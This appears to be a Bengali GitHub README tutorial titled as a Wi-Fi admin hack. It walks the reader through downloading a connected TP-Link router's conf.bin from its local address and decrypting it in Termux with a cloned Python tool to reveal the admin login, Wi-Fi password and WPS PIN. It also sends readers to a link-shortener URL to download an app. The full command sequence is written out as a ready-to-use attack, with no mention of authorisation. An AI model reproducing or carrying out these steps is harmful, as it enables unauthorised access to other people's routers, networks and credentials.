### স্বাগতম আপনাকে, এর নতুন আরেকটি command এ। আজ দেখাবো কানেক্ট থাকা TP-Link রাউটারের পাসওয়ার্ড কিভাবে বের করতে হয় Config.bin ফাইল Extart করে। 
এটা আমরা Termux এর মাধ্যমে করবো। 

আমরা রাউটারের অ্যাডমিন প্যানেল এর Username & Password দেখতে পারবো Config.bin ফাইল এর মাধ্যমে। এমনকি wps pin ও দেখা যাবে এটার মাধ্যমে। 

![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/b0050088-e78e-46fc-981d-a045ea4f2c0f)


তো চলুন শুরু করি :
### app link 
https://play.google.com/store/apps/details?id=idm.internet.download.manager


![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/9c084550-c57c-43bf-8752-b38e287332f3)
### termux app link
https://play.google.com/store/apps/details?id=com.termux
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/71ea946e-a424-47f2-9c9e-79aa58384790)

### 1. প্রথমে নিচের লিংক থেকে এপ্প টা ডাউনলোড করে নিন ?
https://exe.io/9Hkrn
### 2. ইনস্টল করে ওপেন করুন এবং ল্যাঙ্গুয়েজ English সিলেক্ট করুন ?
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/11817e6c-8c51-4476-91ec-becc545f96a7)

### 3. পার্মিসন Allow করুন?
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/266c269f-b2e0-4321-aabc-9120a953c148)

### 4. এরপর  Select এ ক্লিক করুন ?
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/8ab354f7-b4af-40ae-b7d9-c9a63c899524)

### 5. প্লাস আইকনে ক্লিক করুন ?
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/92667928-d08e-4cf7-aafa-1edd24448a1a)

### 6. Add Link এ ক্লিক করুন ?
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/466984a6-6926-4735-bebc-5f611f4440cc)

### 7. এরপর উপরের ফাঁকা বক্সে http://192.168.0.1/cgl/conf.bin? টাইপ করে Connect এ ক্লিক করুন?
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/ef72e729-5ad2-4df3-a647-9e151306ddad)

### 8. এরপর Start এ ক্লিক করুন ফাইল টা  ডাউনলোড হয়ে যাবে ?
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/e36653fc-90e3-4b9c-aaa1-19ee723d8a96)


### 9. ডাউনলোড করা ফাইল টা ইন্টারনাল স্টোরেজের হোম ডিরেক্টরি তে রাখুন?
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/75bb4aeb-7f7a-4eb2-b124-965edd8208fa)

### 10. এখন আমাদের Termux এ যেতে হবে এবং নিচের কম্যান্ড গুলা একটা একটা করে এন্টার করতে হবে ?








### command 
To check for updates and update, run the following command:
```
termux-setup-storage

    apt update -y

    apt upgrade -y

    pkg install git -y

    pkg install python -y

    pip install pycryptodome

    git clone https://github.com/sta-c0000/tpconf_bin_xml

    cd tpconf_bin_xml

    ls

    python tpconf_bin_xml.py /sdcard/conf.bin 1.xml

    ls 

```
### এটা এন্টার করলে নিচের মতো আসবে 
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/5e4c2408-14ee-4290-b88d-4f3e92bb265d)

```
cat 1.xml
```
### এটা এন্টার করার পর নিচের মতো ইন্টারফেস শো হবে, যেখানে রাউটারের সব ইনফরমেশন থাকবে।
এখানে Device Password হলো  Wifi Password এবং  PreShareKey হলো WPS  পিন।
![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/efd25eee-d924-4aff-a351-40f36a4ec7f9)

### এবং তার নিচে রাউটারের Username & Password দেখতে পাবেন।

![image](https://github.com/Gtajisan/wifi-admin-hack/assets/124022055/06b4f573-6957-402e-8ca0-9781c654bf57)


